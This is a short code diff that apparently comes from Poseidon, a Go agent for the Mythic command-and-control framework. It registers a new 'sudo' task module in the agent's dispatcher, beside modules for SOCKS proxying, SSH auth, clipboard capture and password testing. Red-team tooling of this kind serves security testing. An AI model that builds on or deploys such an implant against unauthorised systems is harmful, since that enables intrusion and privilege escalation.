@@ -46,6 +46,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sleep"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sudo"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tail"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tcc_check"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/test_password"
@@ -175,6 +176,8 @@ func listenForNewTask() {
 			go runtimeMainThread.DoOnMainThread(prompt.Run, task)
 		case "clipboard":
 			go clipboard.Run(task)
+		case "sudo":
+			go sudo.Run(task)
 		default:
 			// No tasks, do nothing
 			break
